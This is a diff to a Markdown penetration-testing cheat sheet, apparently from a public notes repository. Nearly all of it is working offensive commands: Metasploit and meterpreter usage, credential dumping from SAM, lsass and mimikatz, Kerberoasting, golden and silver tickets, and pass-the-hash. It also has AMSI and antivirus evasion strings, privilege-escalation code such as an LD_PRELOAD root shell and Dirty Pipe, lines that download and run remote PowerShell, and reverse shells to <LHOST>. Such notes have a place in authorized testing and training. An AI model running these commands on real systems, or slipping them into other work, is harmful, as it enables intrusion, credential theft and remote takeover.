 msf6 > show payloads               // displaying available payloads
 msf6 > set VERBOSE true            // enable verbose output
 msf6 > set forceexploit true       // exploits the target anyways
+msf6 > use post/PATH/TO/MODULE     // use post exploitation module
+msf6 > use post/linux/gather/hashdump    // use hashdump for Linux
 msf6 > use post/multi/manage/shell_to_meterpreter    // shell to meterpreter
 msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
 C:\> > Ctrl + z                                  // put active meterpreter shell in background
@@ -1423,8 +2361,11 @@ meterpreter > ps                                 // checking processes
 meterpreter > migrate 2236                       // migrate to a process
 meterpreter > getuid                             // get the user id
 meterpreter > sysinfo                            // get system information
+meterpreter > search -f <FILE>                   // search for a file
 meterpreter > upload                             // uploading local files to the target
 meterpreter > ipconfig                           // get network configuration
+meterpreter > load powershell                    // loads powershell
+meterpreter > powershell_shell                   // follow-up command for load powershell
 meterpreter > load kiwi                          // load mimikatz
 meterpreter > getprivs                           // get privileges after loading mimikatz
 meterpreter > getsystem                          // gain system privileges if user is member of administrator group
@@ -1453,7 +2394,7 @@ proxychains -q msfconsole
 ##### Auxiliary Output Directory
 
 ```c
-/home/kali/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
+/home/<USERNAME>/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
 ```
 
 ##### Meterpreter Listener
@@ -1497,33 +2438,20 @@ msf6 exploit(multi/handler) > run
 ```
 
 ```c
-C:\> .\<FILE>.exe
+.\<FILE>.exe
 ```
 
 ```c
 meterpreter > download *
 ```
 
-#### ShellShock
-
-```c
-curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
-```
-
 ### Post Exploitation
 
 #### AMSI
 
-##### Test String
-
 ```c
-PS C:\> $str = 'amsiinitfailed'
-```
-
-##### Bypass
-
-```c
-PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
+$str = 'amsiinitfailed'
+$str = 'ams' + 'ii' + 'nitf' + 'ailed'
 ```
 
 #### AppLocker Bypass List
@@ -1582,26 +2510,79 @@ systeminfo
 whoami /all
 net users
 net users <USERNAME>
+tasklist /SVC
+sc query
+sc qc <SERVICE>
+netsh firewall show state
+schtasks /query /fo LIST /v
+findstr /si password *.xml *.ini *.txt
+dir /s *pass* == *cred* == *vnc* == *.config*
+accesschk.exe -uws "Everyone" "C:\Program Files"
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+```
+
+#### Credential Files
+
+> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09
+
+> https://www.nirsoft.net/utils/credentials_file_view.html
+
+```c
+cmdkey /list
+rundll32 keymgr.dll, KRShowKeyMgr
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
 #### Evil-WinRM
 
 ```c
-sudo ruby /usr/local/bin/evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
+evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
+evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
 ```
 
 #### find Commands
 
+##### Specific Size
+
+```c
+find / -size 50M    // find files with a size of 50MB
+```
+
+##### Modified Files
+
+```c
+find / -mtime 10    // find modified files in the last 10 days
+find / -atime 10    // find accessed files in the last 10 days
+find / -cmin -60    // find files changed within the last 60 minutes
+find / -amin -60    // find files accesses within the last 60 minutes
+```
+
+##### Passwords
+
 ```c
 find ./ -type f -exec grep --color=always -i -I 'password' {} \;
+```
 
+##### Group Permissions
+
+```c
 find / -group <group> 2>/dev/null
+```
 
+##### User specific Files
+
+```c
 find / -user <USERNAME> 2>/dev/null
 find / -user <USERNAME> -ls 2>/dev/null
 find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
 find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
+```
 
+##### SUID and SGID Files
+
+```c
 find / -perm -4000 2>/dev/null
 find / -perm -4000 2>/dev/null | xargs ls -la
 find / -type f -user root -perm -4000 2>/dev/null
@@ -1613,21 +2594,22 @@ find / -type f -user root -perm -4000 2>/dev/null
 grep -R db_passwd
 grep -roiE "password.{20}"
 grep -oiE "password.{20}" /etc/*.conf
+grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
 ```
 
 #### Impacket
 
 ```c
 impacket-smbserver local . -smb2support
-impacket-reg <RHOST>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
-impacket-services <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
-impacket-netview <RHOST>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
-impacket-lookupsid <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-GetADUsers -all -dc-ip <RHOST> <RHOST>/
-impacket-getST <RHOST>/<USERNAME> -spn WWW/<DOMAIN_CONTROLLER>.<RHOST> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
-impacket-rpcdump <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-samrdump <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
-impacket-atexec -k -no-pass <RHOST>/Administrator@<DOMAIN_CONTROLLER>.<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
+impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
+impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
+impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
+impacket-getST <DOMAIN>/<USERNAME>$  -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
 ```
 
 ##### impacket-smbclient
@@ -1694,7 +2676,7 @@ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-
 
 ##### Fixing [-] exceptions must derive from BaseException
 
-###### Issue:
+###### Issue
 
 ```c
 ./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
@@ -1703,7 +2685,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [-] exceptions must derive from BaseException
 ```
 
-###### How to fix it:
+###### How to fix it
 
 ```c
 241         if self.__doKerberos:
@@ -1711,180 +2693,650 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 243             target = self.__kdcHost
 ```
 
-#### PowerShell
+#### Internet Information Service (IIS)
 
-##### General Usage
-
-###### Allow Script Execution
+##### Application Pool Credential Dumping
 
 ```c
-PS C:\> set-executionpolicy remotesigned
-PS C:\> Set-ExecutionPolicy unrestricted
+C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
+```
+
+#### JAWS
+
+```c
+IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
+```
+
+#### Kerberos
+
+> https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+
+##### Bruteforce
+
+```c
+./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
+```
+
+###### With List of Users
+
+```c
+.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
+```
+
+###### Check Passwords for all Users in Domain
+
+```c
+.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
+```
+
+##### ASPREPRoast
+
+###### Check ASPREPRoast for all Domain Users (Credentials required)
+
+```c
+impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
+impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
+```
+
+###### Check ASPREPRoast for a List of Users (No Credentials required)
+
+```c
+impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
+impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
+```
+
+###### Check ASPREPRoast for all Domain Users in Domain
+
+```c
+.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
+```
+
+##### Kerberoasting
+
+```c
+python GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
+.\Rubeus.exe kerberoast /outfile:<FILE>
+iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
+Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
+```
+
+##### Overpass The Hash/Pass The Key (PTK)
+
+###### Request TGT with Hash
+
+```c
+impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
+```
+
+###### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)
+
+```c
+impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
+```
+
+###### Request TGT with Password
+
+```c
+impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
+```
+
+###### Set TGT for Impacket Usage
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+###### Execute Remote Commands
+
+```c
+impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+```
+
+###### Ask and inject the Ticket
+
+```c
+.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
+```
+
+###### Execute a CMD on Remote Host
+
+```c
+.\PsExec.exe -accepteula \\<RHOST> cmd
+```
+
+##### Pass The Ticket (PTT)
+
+###### Harvest Tickets from Linux
+
+###### Check Type and Location of Tickets
+
+```c
+grep default_ccache_name /etc/krb5.conf
+```
+
+* If none return, default is FILE:/tmp/krb5cc_%{uid}
+* In Case of File Tickets it is possible to Copy-Paste them to use them
+* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
+* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
+* To inject, the Ticket have to be copied in a reachable Folder by all Users
+
+```c
+cp tickey /tmp/tickey
+/tmp/tickey -i
+```
+
+###### Harvest Tickets from Windows
+
+```c
+mimikatz # sekurlsa::tickets /export
+.\Rubeus dump
+```
+
+###### Convert Tickets dumped with Rubeus into base64
+
+```c
+[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
+```
+
+###### Convert Tickets between Linux and Windows Format with ticket_converter.py
+
+> https://github.com/Zer1t0/ticket_converter
+
+```c
+python ticket_converter.py ticket.kirbi ticket.ccache
+python ticket_converter.py ticket.ccache ticket.kirbi
+```
+
+###### Using Ticket on Linux
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+###### Execute Remote Commands by using TGT
+
+```c
+impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+```
+
+###### Using Ticket on Windows
+
+###### Inject Ticket with mimikatz
+
+```c
+mimikatz # kerberos::ptt <KIRBI_FILE>
+```
+
+###### Inject Ticket with Rubeus
+
+```c
+.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
+```
+
+###### Execute a CMD on Remote Host
+
+```c
+.\PsExec.exe -accepteula \\<RHOST> cmd
+```
+
+##### Silver Ticket
+
+###### Impacket Examples
+
+###### Generate TGS with NTLM
+
+```c
+python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
+```
+
+###### Generate TGS with aesKey
+
+```c
+python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
+```
+
+###### Set the ticket for impacket use
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+###### Execute Remote Commands by using TGT
+
+```c
+impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+```
+
+##### mimikatz Examples
+
+###### Generate TGS with NTLM
+
+```c
+mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
+```
+
+###### Generate TGS with AES 128bit Key
+
+```c
+mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
+```
+
+###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
+
+```c
+mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
+```
+
+###### Inject TGS with Mimikatz
+
+```c
+mimikatz # kerberos::ptt <KIRBI_FILE>
+```
+
+##### Rubeus Examples
+
+```c
+.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
+```
+
+###### Execute CMD on Remote Host
+
+```c
+.\PsExec.exe -accepteula \\<RHOST> cmd
+```
+
+##### Golden Ticket
+
+###### Impacket Examples
+
+###### Generate TGT with NTLM
+
+```c
+python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
+```
+
+###### Generate TGT with aesKey
+
+```c
+python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
+```
+
+###### Set TGT for Impacket Usage
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+###### Execute Remote Commands by using TGT
+
+```c
+impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+```
+
+##### mimikatz Examples
+
+###### Generate TGT with NTLM
+
+```c
+mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
+```
+
+###### Generate TGT with AES 128bit Key
+
+```c
+mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
+```
+
+###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
+
+```c
+mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
+```
+
+###### Inject TGT with Mimikatz
+
+```c
+mimikatz # kerberos::ptt <KIRBI_FILE>
+```
+
+##### Rubeus Examples
+
+###### Inject Ticket with Rubeus
+
+```c
+.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
+```
+
+###### Execute CMD on Remote Host
+
+```c
+.\PsExec.exe -accepteula \\<RHOST> cmd
+```
+
+###### Get NTLM from Password
+
+```c
+python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
+```
+
+#### LD_Preload
+
+> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+```
+
+```c
+$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+$ ls -la shell.so
+$ sudo LD_PRELOAD=/tmp/shell.so find
+$ sudo LD_PRELOAD=/tmp/shell.so /opt/<FILE>.sh
+```
+
+#### Linux Wildcards
+
+> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+```c
+$ touch -- --checkpoint=1
+$ touch -- '--checkpoint-action=exec=sh shell.sh'
+$ rm ./'--checkpoint-action=exec=python script.sh'
+```
+
+#### logrotten
+
+> https://github.com/whotwagner/logrotten
+
+```c
+if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
+```
+
+##### If "create"-option is set in logrotate.cfg
+
+```c
+./logrotten -p ./payloadfile /tmp/log/pwnme.log
+```
+
+##### If "compress"-option is set in logrotate.cfg
+
+```c
+./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
+```
+
+#### Lsass
+
+##### Dump
+
+```c
+tasklist
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
+```
+
+#### Path Variable Hijacking
+
+```c
+find / -perm -u=s -type f 2>/dev/null
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+export PATH=$(pwd):$PATH
+```
+
+#### PowerShell
+
+##### Common Commands
+
+```c
+whoami /all
+getuserid
+systeminfo
+Get-Process
+net users
+net users <USERNAME>
+Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=LOCAL"
+Get-Content <FILE>
+Get-ChildItem . -Force
+GCI -hidden
+[convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
+```
+
+##### Allow Script Execution
+
+```c
+set-executionpolicy remotesigned
+Set-ExecutionPolicy unrestricted
 ```
 
 ##### Script Execution Bypass
 
 ```c
-PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
+powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
 ##### Import Module to PowerShell cmdlet
 
 ```c
-PS C:\> import-module ./<module / powershell script>
+import-module ./<module / powershell script>
 ```
 
 ##### Check PowerShell Versions
 
 ```c
-PS Set-ExecutionPolicy Unrestricted
-PS powershell -Command "$PSVersionTable.PSVersion"
-PS powershell -c "[Environment]::Is64BitProcess"
+Set-ExecutionPolicy Unrestricted
+powershell -Command "$PSVersionTable.PSVersion"
+powershell -c "[Environment]::Is64BitProcess"
+```
+
+##### Read PowerShell History
+
+```c
+type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+##### Create a .zip-File
+
+```c
+Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
 ```
 
 ##### Start offsec Session
 
 ```c
-PS /home/kali> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
-PS /home/kali> Enter-PSSession $offsec_session
+$offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
+Enter-PSSession $offsec_session
 ```
 
-##### PSCredential
+##### Execute Command as another User
 
 ```c
-Import-CliXml
-Export-CliXml
+$username = '<USERNAME>'
+$password = '<PASSWORD>'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process powershell.exe -Credential $credential
 ```
 
 ```c
-PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
 ```
 
-#### AntiVirus Handling
-
-##### AntiVirus Bypass for Invoke-Expression (IEX)
+##### Add new Domain Administrator
 
 ```c
-PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
+$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
+New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
+Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
 ```
 
-###### Explaination
+##### Execute Commands in User Context
 
 ```c
-$PSHome[4]     // equals "i"
-$PSHome[30]    // equals "e"
-+x             // adds an "x"
+$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
+$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
+Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
 ```
 
-##### Alternative
+##### Execute Scripts with Credentials (Reverse Shell)
 
 ```c
-PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
+$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
+Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
 ```
 
-###### Explaination
+#### pwncat
 
 ```c
-$eNV:COmSPeC[4]     // equals "i"
-$eNV:COmSPeC[15]    // equals "e"
-$eNV:COmSPeC[25}    // equals "x"
+(local) pwncat$ back    // get back to shell
+Ctrl+d                  // get back to pwncat shell
 ```
 
-##### System
-
-###### Show current User
-
 ```c
-PS C:\> whoami /all
-PS C:\> getuserid
+pwncat-cs -lp <LPORT>
+(local) pwncat$ download /PATH/TO/FILE/<FILE> .
+(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
 ```
 
-###### Show Groups
+#### regedit
+
+##### Dumping Credentials
 
 ```c
-PS C:\> whoami /groups
+reg save hklm\system system
+reg save hklm\sam sam
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
 ```
 
-###### Get System Information
+#### Rubeus
+
+##### Overpass the Hash
 
 ```c
-PS C:\> systeminfo
+Rubeus.exe kerberoast /user:<USERNAME>
 ```
 
-###### Get Process List
+##### Pass the Hash
 
 ```c
-PS C:\> Get-Process
+.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
 ```
 
-###### Get net user Information
+#### RunasCs
 
 ```c
-PS C:\> net users
-PS C:\> net users <USERNAME>
+./RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
+./RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
 ```
 
-###### Get User List
+#### SeBackup and SeRestore Privilege
+
+##### Backup SAM and SYSTEM Hashes
 
 ```c
-PS C:\> Get-ADUser -Filter * -SearchBase "DC=<RHOST>,DC=LOCAL"
+reg save hklm\system C:\Users\<USERNAME>\system.hive
+reg save hklm\sam C:\Users\<USERNAME>\sam.hive
 ```
 
-###### Invoke-Expression File Transfer
+##### Dumping Hashes
 
 ```c
-PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
+secretsdump.py -sam sam.hive -system system.hive LOCAL
 ```
 
-###### Add new Domain Administrator
+##### Pass the Hash
 
 ```c
-PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
-PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
-PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<RHOST>
 ```
 
-###### Execute Commands in User Context
+#### SeBackupPrivilege Privilege Escalation (diskshadow)
+
+> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
+
+##### Script for PowerShell Environment
 
 ```c
-PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
-PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
-PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
+SET CONTEXT PERSISTENT NOWRITERSp
+add volume c: alias foobarp
+createp
+expose %foobar% z:p
 ```
 
-###### Execute Scripts with Credentials (Reverse Shell)
-
 ```c
-PS C:\Windows\system32> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-PS C:\Windows\system32> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
-PS C:\Windows\system32> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
+diskshadow /s <FILE>.txt
 ```
 
-###### New-PSSession
+##### Copy ntds.dit
 
 ```c
-PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
-$username = "<DOMAIN>\<USERNAME>"
-PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
-$password = "<PASSWORD>"
-PS C:\Users\<USERNAME>\Downloads\backups> $secstr = New-Object -TypeName System.Security.SecureString
-$secstr = New-Object -TypeName System.Security.SecureString
-PS C:\Users\<USERNAME>\Downloads\backups> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
-$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
-PS C:\Users\<USERNAME>\Downloads\backups> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
-PS C:\Users\<USERNAME>\Downloads\backups> new-pssession -computername . -credential $cred
-new-pssession -computername . -credential $cred
+Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
+```
 
- Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
- -- ----            ------------    ------------    -----         -----------------     ------------
-  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available
+##### Export System Registry Value
 
-PS C:\Users\<USERNAME>\Downloads\backups> enter-pssession 1
-enter-pssession 1
-[localhost]: PS C:\Users\<USERNAME>\Documents> whoami
-whoami
-<DOMAIN>\<USERNAME>
+```c
+reg save HKLM\SYSTEM c:\temp\system
+```
+
+Download `ndts.dit` and system and get the hashes from `secretsdump.py` of the impacket-suite.
+
+#### SeTakeOwnership Privilege
+
+```c
+takeown /f C:\Windows\System32\Utilman.exe
+```
+
+```c
+icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
+```
+
+```c
+C:\Windows\System32\> copy cmd.exe utilman.exe
+```
+
+Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.
+
+#### SeImpersonate and SeAssignPrimaryToken Privilege
+
+> https://github.com/antonioCoco/RogueWinRM
+
+```c
+.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
+```
+
+#### Unquoted Service Paths
+
+Search for `Unquoted Service Paths` by using `sc qc`.
+
+```c
+sc qc
+sc qc WindowsScheduler
+sc stop WindowsScheduler
+sc start WindowsScheduler
+```
+
+```c
+icacls <PROGRAM>.exe
+icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
+icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
 ```
 
 #### Windows Tasks & Services
@@ -1914,16 +3366,34 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 /tmp
 ```
 
+#### writeDACL
+
+> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
+
+##### Usage
+
+```c
+$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
+Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
+```
+
 ### CVE
 
-#### Juicy Potato
+#### Dirty Pipe (CVE-2022-0847)
 
-> https://github.com/ohpe/juicy-potato
+```c
+gcc -o dirtypipe dirtypipe.c
+./dirtypipe /etc/passwd 1 ootz:
+su rootz
+```
+
+#### Juicy Potato
 
 ##### msfvenom and Metasploit Execution
 
 ```c
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
 ```
 
 ```c
